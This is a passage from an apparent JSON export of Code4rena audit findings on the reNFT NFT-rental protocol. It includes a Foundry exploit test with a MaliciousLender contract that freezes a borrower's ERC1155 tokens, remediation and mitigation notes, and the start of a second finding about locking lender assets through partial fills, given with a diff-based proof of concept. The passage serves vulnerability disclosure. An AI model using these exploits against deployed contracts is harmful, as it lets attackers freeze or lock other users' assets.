.offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n\n    interface IERC1155 {\n\n        function balanceOfBatch(\n            address[] calldata accounts,\n            uint256[] calldata ids\n        ) external view returns (uint256[] memory);\n\n        function setApprovalForAll(address operator, bool approved) external;\n\n    }\n\n\n    contract MaliciousLender {\n\n        address private owner; // owner of the contract\n        uint256 private timestamp; // The timestamp until which, the onERC1155Received function will keep reverting\n\n        constructor() {\n            owner = msg.sender;\n        }\n\n        function onERC1155Received(address, address, uint256, uint256, bytes memory) public virtual returns (bytes4) {\n\n            if (block.timestamp < timestamp) {\n                revert(\"!\");\n            }\n            return this.onERC1155Received.selector;\n        }\n\n        function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) public virtual returns (bytes4) {\n\n            if (block.timestamp < timestamp) {\n                revert(\"!\");\n            }\n            return this.onERC1155BatchReceived.selector;\n        }\n\n        // A helper function to split the signature \n        function splitSignature(bytes memory sig)\n            public\n            pure\n            returns (uint8 v, bytes32 r, bytes32 s)\n        {\n            require(sig.length == 65);\n\n            assembly {\n                // first 32 bytes, after the length prefix.\n                r := mload(add(sig, 32))\n                // second 32 bytes.\n                s := mload(add(sig, 64))\n                // final byte (first byte of the next 32 bytes).\n                v := byte(0, mload(add(sig, 96)))\n            }\n\n            return (v, r, s);\n        }\n\n        // EIP-1271 support. \n        // Since this is a smart contract and not an EOA fulfilling the order, this function will be called by seaport.\n        function isValidSignature(bytes32 _hash, bytes memory _signature) external returns(bytes4) {\n            (uint8 v, bytes32 r, bytes32 s) = splitSignature(_signature);\n            address recoveredAddr = ecrecover(_hash, v, r, s);\n            if (recoveredAddr == owner) {\n                return 0x1626ba7e;\n            } else {\n                return 0x00000000;\n            }\n        }\n\n        // This is a function where the malicious lender sets the timestamp until which, the onERC1155Received function will keep reverting.\n        function setDuration(uint256 _timestamp) external onlyOwner {\n            timestamp = _timestamp;\n        }\n\n        // A function utilized by the owner (the malicious lender) to be able to approve addresses to move tokens out of this contract. \n        // that address can be the conduit, it can be himself etc\n        function approveAddrToSpendToken(address _token, address _addr) external onlyOwner {\n            IERC1155(_token).setApprovalForAll(_addr, true);\n        }\n\n\n        modifier onlyOwner {\n            require(msg.sender == owner);\n            _;\n        }\n    }\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType,\n        OfferItem,\n        ItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OfferItemLib} from \"@seaport-sol/SeaportSol.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n    import {Errors} from \"@src/libraries/Errors.sol\";\n\n    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';\n    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';\n    import {Ownable} from \"@openzeppelin-contracts/access/Ownable.sol\";\n    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        using OfferItemLib for OfferItem;\n\n        function test_ERC1155_Freeze_Exploit() public {\n\n\n            vm.startPrank(attacker.addr);\n\n            // A test ERC1155 token\n            TestERC1155Token testERC1155Token = new TestERC1155Token();\n\n            // Bob will be the borrower, and he mint him 1000 tokens in his safe before him borrowing anything.\n            testERC1155Token.mint(address(bob.safe), 1, 1000, \"\");\n\n            // The malicious lender is a smart contract not an EOA \n            //    (Check it's implementation at L-1755 in SetupExploit.sol)\n            //    Also check L-479 and L-500-501 in SetupExploit.sol\n\n            // We minting him 10 tokens because those are the ones he is going to lend to Bob (the borrower)\n            testERC1155Token.mint(address(maliciousLenderContract), 1, 10, \"\");\n\n            vm.stopPrank();\n\n            // Approve seaport conduit to spend the token.\n            vm.prank(address(maliciousLenderContract));\n            testERC1155Token.setApprovalForAll(address(conduit), true);\n\n            // Cache the attacker's EOA address\n            address attackersOriginalEOA_Address = attacker.addr;\n\n            // We're doing this because we're passing the attacker's `ProtocolAccount` struct to `createOrder()`\n            // And we're doing so because we want to simulate the lender being a smart contract not an EOA\n            attacker.addr = address(maliciousLenderContract);\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // create a BASE order\n            createOrder({\n                offerer: attacker,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Restore the correct address of the ProtocolAccount `attacker` struct.\n            attacker.addr = attackersOriginalEOA_Address;\n\n            // Remove the pre-inserted offer item (which is inserted by the tests)\n            popOfferItem();\n\n            // Set the test ERC1155 token which we created as the offer item\n            withOfferItem(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(testERC1155Token))\n                        .withIdentifierOrCriteria(1)\n                        .withStartAmount(10)\n                        .withEndAmount(10)\n            );\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: bob,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n            // assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(bob.safe), address(testERC1155Token), 1), true);\n\n            // assert that the ERC1155 is in the rental wallet of the fulfiller\n            assertEq(testERC1155Token.balanceOf(address(bob.safe), 1), 1010);\n\n\n            /** ------------------- Exploitation ------------------- */\n\n            // Check the `MaliciousLender` contract in SetupExploit.sol\n            // `.setDuration(<timestamp>)` is a function which lets the lender choose until when he'll keep the victim's funds freezed\n            vm.prank(attacker.addr);\n            maliciousLenderContract.setDuration(100000000);\n\n            /** ---------------------------------------------------- */\n\n\n            // Simulate that the rental has been stopped\n            vm.warp(block.timestamp + 100000);\n\n            // Impersonate bob\n            vm.startPrank(bob.addr);\n\n\n            /** ------- Bob will try to stop the rental but will fail. -------- */\n            vm.expectRevert(\n                Errors.StopPolicy_ReclaimFailed.selector\n            );\n\n            stop.stopRent(rentalOrder);\n\n\n            /** ------- Bob will try to transfer some of his pre-rental ERC1155 tokens to Alice but will fail. -------- */\n\n            // Transaction calldata to transfer the token ERC1155 tokens\n            bytes memory transaction = abi.encodeWithSelector(\n                testERC1155Token.safeTransferFrom.selector,\n                address(bob.safe),\n                alice.addr,\n                1,\n                500,\n                \"\"\n            );\n\n            // The signature of the token transferral call\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(bob.safe),\n                bob.privateKey,\n                address(testERC1155Token),\n                transaction\n            );\n\n\n            // We expect that the TX will fail because of the guard not differentiating between\n            //    ERC1155 tokens that are rented and those that are not.\n            vm.expectRevert(\n                abi.encodeWithSelector(\n                    Errors.GuardPolicy_UnauthorizedSelector.selector,\n                    ERC1155.safeTransferFrom.selector\n                )\n            );\n\n            SafeUtils.executeTransaction(\n                address(bob.safe),\n                address(testERC1155Token),\n                transaction,\n                transactionSignature\n            );\n\n            vm.stopPrank();\n\n\n        }\n\n    }\n\n\n\n\n\n\n\n\n\n\n\n\n    contract TestERC1155Token is ERC1155, Ownable {\n        constructor() ERC1155(\"\") Ownable(msg.sender) {}\n\n        function mint(address account, uint256 id, uint256 amount, bytes memory data)\n            public\n            onlyOwner\n        {\n            _mint(account, id, amount, data);\n        }\n\n        function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data)\n            public\n            onlyOwner\n        {\n            _mintBatch(to, ids, amounts, data);\n        }\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nAllows a malicious lender to indefinitely freeze borrower's assets.\n\n***\n\n### Remediation\n\n***\n\nThe guard needs to differentiate between ERC1155 tokens of same type and ID that are rented and those that are not actively rented. This can be done by implementing a mapping which keeps track of the amount of ERC1155 tokens that become rented and this mapping can then be utilized by the guard to determine whether or not it should let the transferral of the ERC1155 tokens pass.\n\n***\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/600#issuecomment-1910770119)**\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/600)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/8) - Allows distinction between rented and non-rented ERC1155 tokens. Renters should be able to transfer amounts of these tokens that do not cut into the active rented amount.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/9), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/48) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/37).\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability found in the Guard.sol contract, which is a contract used to protect against theft of rented ERC721/1155 tokens. The vulnerability allows a malicious lender to freeze a borrower's pre-existing tokens indefinitely by preventing the rental from being stopped. This is done by exploiting the fact that the contract does not differentiate between actively rented tokens and non-rented tokens of the same ID. The report also includes a proof of concept code to demonstrate the exploit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/600",
      "tags": [],
      "finders": [
        "said",
        "sin1st3r\\_\\_",
        "evmboi32",
        "jasonxiale",
        "KupiaSec",
        "kaden",
        "JCN",
        "Jorgect",
        "J4X",
        "0xA5DF"
      ]
    },
    {
      "id": "30527",
      "title": "[H-07] Attacker can lock lender NFTs and ERC20 in the safe if the offer is set to partial",
      "impact": "HIGH",
      "content": "\nIf the lender creates an offer set to partial, the attacker can lock parts of the lender's assets inside the attacker's safe.\n\n### Proof of Concept\n\nWhen reNFT zone validates the offer and create the rental, it will calculate order hash using `_deriveRentalOrderHash`, and add the rentals by calling `  STORE.addRentals ` to storage using the calculated hash.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L592-L595>\n\n<details>\n\n```solidity\n    function _rentFromZone(\n        RentPayload memory payload,\n        SeaportPayload memory seaportPayload\n    ) internal {\n        // Check: make sure order metadata is valid with the given seaport order zone hash.\n        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n\n        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n\n        // Check: verify each execution was sent to the expected destination.\n        _executionInvariantChecks(\n            seaportPayload.totalExecutions,\n            payload.fulfillment.recipient\n        );\n\n        // Check: validate and process seaport offer and consideration items based\n        // on the order type.\n        Item[] memory items = _convertToItems(\n            seaportPayload.offer,\n            seaportPayload.consideration,\n            payload.metadata.orderType\n        );\n\n        // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders\n        // do not need to be processed in the same way that other order types do.\n        if (\n            payload.metadata.orderType.isBaseOrder() ||\n            payload.metadata.orderType.isPayOrder()\n        ) {\n            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n            // the rented amount. From this point on, new memory cannot be safely allocated until the\n            // accumulator no longer needs to include elements.\n            bytes memory rentalAssetUpdates = new bytes(0);\n\n            // Check if each item is a rental. If so, then generate the rental asset update.\n            // Memory will become safe again after this block.\n            for (uint256 i; i < items.length; ++i) {\n                if (items[i].isRental()) {\n                    // Insert the rental asset update into the dynamic array.\n                    _insert(\n                        rentalAssetUpdates,\n                        items[i].toRentalId(payload.fulfillment.recipient),\n                        items[i].amount\n                    );\n                }\n            }\n\n            // Generate the rental order.\n            RentalOrder memory order = RentalOrder({\n                seaportOrderHash: seaportPayload.orderHash,\n                items: items,\n                hooks: payload.metadata.hooks,\n                orderType: payload.metadata.orderType,\n                lender: seaportPayload.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + payload.metadata.rentDuration\n            });\n\n            // Compute the order hash.\n>>>         bytes32 orderHash = _deriveRentalOrderHash(order);\n\n            // Interaction: Update storage only if the order is a Base Order or Pay order.\n>>>         STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));\n\n            // Interaction: Increase the deposit value on the payment escrow so\n            // it knows how many tokens were sent to it.\n            for (uint256 i = 0; i < items.length; ++i) {\n                if (items[i].isERC20()) {\n                    ESCRW.increaseDeposit(items[i].token, items[i].amount);\n                }\n            }\n\n            // Interaction: Process the hooks associated with this rental.\n            if (payload.metadata.hooks.length > 0) {\n                _addHooks(\n                    payload.metadata.hooks,\n                    seaportPayload.offer,\n                    payload.fulfillment.recipient\n                );\n            }\n\n            // Emit rental order started.\n            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);\n        }\n    }\n```\n\n</details>\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L162-L195>\n\n<details>\n\n```solidity\n    function _deriveRentalOrderHash(\n        RentalOrder memory order\n    ) internal view returns (bytes32) {\n        // Create arrays for items and hooks.\n        bytes32[] memory itemHashes = new bytes32[](order.items.length);\n        bytes32[] memory hookHashes = new bytes32[](order.hooks.length);\n\n        // Iterate over each item.\n        for (uint256 i = 0; i < order.items.length; ++i) {\n            // Hash the item.\n            itemHashes[i] = _deriveItemHash(order.items[i]);\n        }\n\n        // Iterate over each hook.\n        for (uint256 i = 0; i < order.hooks.length; ++i) {\n            // Hash the hook.\n            hookHashes[i] = _deriveHookHash(order.hooks[i]);\n        }\n\n        return\n            keccak256(\n                abi.encode(\n                    _RENTAL_ORDER_TYPEHASH,\n                    order.seaportOrderHash,\n                    keccak256(abi.encodePacked(itemHashes)),\n                    keccak256(abi.encodePacked(hookHashes)),\n                    order.orderType,\n                    order.lender,\n                    order.renter,\n                    order.startTimestamp,\n                    order.endTimestamp\n                )\n            );\n    }\n```\n</details>\n\n\nThe problem is that if a lender's offer is created to support partial fills, the attacker can create multiple similar orders referring to the same `seaportPayload.orderHash`. Because the similar orders result in the same hash, the amount of assets that will be returned to the attacker for that hash will be only equal to the `items[i].amount` value of the order, while the remaining assets will be locked. Because the second time lender call `stopRent` it will revert caused by the rental status already removed.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L216-L235>\n\n```solidity\n    function removeRentals(\n        bytes32 orderHash,\n        RentalAssetUpdate[] calldata rentalAssetUpdates\n    ) external onlyByProxy permissioned {\n        // The order must exist to be deleted.\n        if (!orders[orderHash]) {\n>>>         revert Errors.StorageModule_OrderDoesNotExist(orderHash);\n        } else {\n            // Delete the order from storage.\n            delete orders[orderHash];\n        }\n\n        // Process each rental asset.\n        for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {\n            RentalAssetUpdate memory asset = rentalAssetUpdates[i];\n\n            // Reduce the amount of tokens for the particular rental ID.\n            rentedAssets[asset.rentalId] -= asset.amount;\n        }\n    }\n```\n\nExample Scenario :\n\nAlice create `PAY` Offer that support partial fills consist of 2 ERC1155 and 100 ERC20 token A for the provided duration.\n\nBob fills the offer, by creating two similar partial fills, 1 ERC1155 and 50 ERC20.\n\nBecause the two offer result in the same order hash, when alice want to stop the rent, alice will only get 1 ERC1155 and 50 ERC20.\n\nCoded PoC :\n\nModify the test files to the following :\n\n<Details>\n\n```diff\ndiff --git a/test/fixtures/engine/OrderCreator.sol b/test/fixtures/engine/OrderCreator.sol\nindex 6cf6050..a4791d4 100644\n--- a/test/fixtures/engine/OrderCreator.sol\n+++ b/test/fixtures/engine/OrderCreator.sol\n@@ -64,9 +64,10 @@ contract OrderCreator is BaseProtocol {\n \n         // Define a standard OrderComponents struct which is ready for\n         // use with the Create Policy and the protocol conduit contract\n+        // PARTIAL_RESTRICTED from FULL_RESTRICTED\n         OrderComponentsLib\n             .empty()\n-            .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n+            .withOrderType(SeaportOrderType.PARTIAL_RESTRICTED)\n             .withZone(address(create))\n             .withStartTime(block.timestamp)\n             .withEndTime(block.timestamp + 100)\ndiff --git a/test/fixtures/engine/OrderFulfiller.sol b/test/fixtures/engine/OrderFulfiller.sol\nindex d61448a..5f12d23 100644\n--- a/test/fixtures/engine/OrderFulfiller.sol\n+++ b/test/fixtures/engine/OrderFulfiller.sol\n@@ -113,6 +113,54 @@ contract OrderFulfiller is OrderCreator {\n         );\n     }\n \n+    function createOrderFulfillmentPartial(\n+        ProtocolAccount memory _fulfiller,\n+        Order memory order,\n+        bytes32 orderHash,\n+        OrderMetadata memory metadata\n+    ) internal {\n+        // set the fulfiller account\n+        fulfiller = _fulfiller;\n+\n+        // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n+        // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n+        seaportRecipient = address(_fulfiller.safe);\n+\n+        // get a pointer to a new order to fulfill\n+        OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n+\n+        // create an order fulfillment\n+        OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n+\n+        // add the order hash and fulfiller\n+        orderToFulfill.orderHash = orderHash;\n+\n+        // create rental zone payload data\n+        _createRentalPayload(\n+            orderToFulfill.payload,\n+            RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n+        );\n+\n+        // generate the signature for the payload\n+        bytes memory signature = _signProtocolOrder(\n+            rentalSigner.privateKey,\n+            create.getRentPayloadHash(orderToFulfill.payload)\n+        );\n+\n+        // create an advanced order from the order. Pass the rental\n+        // payload as extra data\n+        _createAdvancedOrder(\n+            orderToFulfill.advancedOrder,\n+            AdvancedOrder(\n+                order.parameters,\n+                1,\n+                2,\n+                order.signature,\n+                abi.encode(orderToFulfill.payload, signature)\n+            )\n+        );\n+    }\n+\n     function _createOrderFulfiller(\n         ProtocolAccount storage storageFulfiller,\n         ProtocolAccount memory _fulfiller\n@@ -323,6 +371,96 @@ contract OrderFulfiller is OrderCreator {\n         }\n     }\n \n+    function _createRentalOrderPartial(\n+        OrderToFulfill memory orderToFulfill\n+    ) internal view returns (RentalOrder memory rentalOrder) {\n+        // get the order parameters\n+        OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n+\n+        // get the payload\n+        RentPayload memory payload = orderToFulfill.payload;\n+\n+        // get the metadata\n+        OrderMetadata memory metadata = payload.metadata;\n+\n+        // construct a rental order\n+        rentalOrder = RentalOrder({\n+            seaportOrderHash: orderToFulfill.orderHash,\n+            items: new Item[](parameters.offer.length + parameters.consideration.length),\n+            hooks: metadata.hooks,\n+            orderType: metadata.orderType,\n+            lender: parameters.offerer,\n+            renter: payload.intendedFulfiller,\n+            rentalWallet: payload.fulfillment.recipient,\n+            startTimestamp: block.timestamp,\n+            endTimestamp: block.timestamp + metadata.rentDuration\n+        